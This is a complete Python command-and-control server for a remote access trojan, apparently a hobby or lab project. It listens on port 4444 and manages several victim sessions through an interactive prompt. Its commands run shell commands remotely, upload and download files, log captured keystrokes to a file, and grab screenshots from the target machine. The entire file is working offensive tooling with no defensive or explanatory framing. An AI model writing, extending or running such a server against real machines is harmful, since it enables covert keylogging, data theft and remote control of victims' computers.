#!/usr/bin/env python3

import time
import os
import subprocess
import sys
import threading
import string
import random
import socket
import json
import base64
import multiprocessing

def reliable_send(client,data):
    jsonData = json.dumps(data)
    client.send(jsonData.encode())

def reliable_recv(client):
    jsonData = ""
    while True:
        try:
            jsonData = jsonData + client.recv(1024).decode()
            return json.loads(jsonData)
        except ValueError:
            continue

def upload(client,fileName):
    f = open(fileName,"rb")
    client.send(f.read())

def download(client,fileName):
    f = open(fileName,"wb")
    client.settimeout(1)
    chunk = client.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)
        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()

def randomName():
	str = string.digits + string.ascii_letters
	randomName = ""
	for i in range(10):
			randomName = randomName + random.choice(str)
	return randomName + ".jpg"

def keylog(client):
	sys.stdout.write(">>>> Key: ")
	sys.stdout.flush()
	while True:
		try:
			key = reliable_recv(client)
			keys.append(key)
			writeFile("log.txt")
			sys.stdout.write(key + " ")
			sys.stdout.flush()
		except KeyboardInterrupt:
			break

def cmdExec(cmd):
	if cmd[:2] == "cd":
		if os.path.isdir(cmd[3:]):
			os.chdir(cmd[3:])
			print("--> Changed to " + cmd[3:] + " directory")
		else:
			print("--> Directory doesn't exist")
	else:
		result = subprocess.Popen(cmd, shell=True, stdout = subprocess.PIPE, stderr = subprocess.PIPE)
		output = result.stdout.read() + result.stderr.read()
		print(output)

def writeFile(fileName):
	with open(fileName,"w") as file:
		for key in keys:
			file.write(key + " ")

def shell(client,number):
	while True:
		cmd = input("#(session " + str(number) + ") ~cmd: ")
		reliable_send(client, cmd)
		if cmd == "exit" or cmd == "quit":
			print(">>>> Session " + str(number) + " has just been deleted")
			clients.remove(client)
			client.close()
			break
		elif cmd == "back":
			break
		elif cmd[:8] == "download":
			arr = cmd.split(" ")
			download(client,arr[2])
			print(">>>> Download successfully")
		elif cmd[:6] == "upload":
			arr = cmd.split(" ")
			upload(client,arr[1])
			print(">>>> Upload successfully")
		elif cmd[:2] == "cd" or len(cmd) == 0:
			continue
		elif cmd == "help":
			print("---> download <source_file> <destination_file>")
			print("---> upload <source_file> <destination_file>")
			print("---> keylog - to get pressed keys")
			print("---> screenshot - to screenshot target's screen")
			print("---> sessions - to list all current sessions")
			print("---> help - to show this intruction")
			print("---> back - to return the center")
			print("---> exit - to destroy this session")
		elif cmd == "screenshot":
			imgName = randomName()
			download(client,imgName)
			time.sleep(3)
			print(">>>> Output file: " + imgName)
		elif cmd == "sessions":
			count = 0
			for address in addrs:
					count = count + 1
					print(">>>> Session  " + str(count) + ": " +str(address))
		elif cmd == "keylog":
			print(">>>> Enter 'quit' to stop keylog")
			p1 = multiprocessing.Process(target=keylog,args=(client,))
			p1.start()
			while True:
				cmd = input()
				if cmd == "quit":
					reliable_send(client,cmd)
					p1.terminate()
					break
		else:
			output = reliable_recv(client)
			print(output)

def alwaysListen():
	while True:
		client,address = server.accept()
		clients.append(client)
		addrs.append(address)
		print("\n--> New connection from " + str(address))
		sys.stdout.write("--> There are currently " + str(len(clients))  +  " session. Enter 'sessions' command to list all sessions \n$>_{Control and Command}: ")
		sys.stdout.flush()

addrs = []
clients = []
keys = []
server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server.bind(("127.0.0.1",4444))
server.listen(2)
print("[+] Server is listening at port 4444......\n")
t1 = threading.Thread(target=alwaysListen)
t1.start()
while True:
	try:
		center = input("$>_{Control and Command}: ")
		if center == "exit":
			server.close()
			os._exit(0)
		elif center[:8] == "interact":
			numInput = center.split(" ")[1]
			if numInput.isdigit():
				num = int(numInput)
				if num > len(clients) or num <= 0:
					print("--> Session does not exist")
				else:
					shell(clients[num-1],num)
			else:
				print("--> Error cmd")
		elif center == "sessions":
			if len(clients) == 0:
				print("--> No sessions")
			else:
				count = 0
				for addr in addrs:
					count = count + 1
					print("--> Session " + str(count) + ": " + str(addr))
		elif center == "help":
			print("--> sessions - to list all sessions")
			print("--> interact <number> - to interact with the respective session")
			print("--> help - to show this instruction")
			print("--> exit - to quit program")
		else:
			cmdExec(center)
	except KeyboardInterrupt:
		print("\n--> Bye friend !!!")
		server.close()
		os._exit(0)

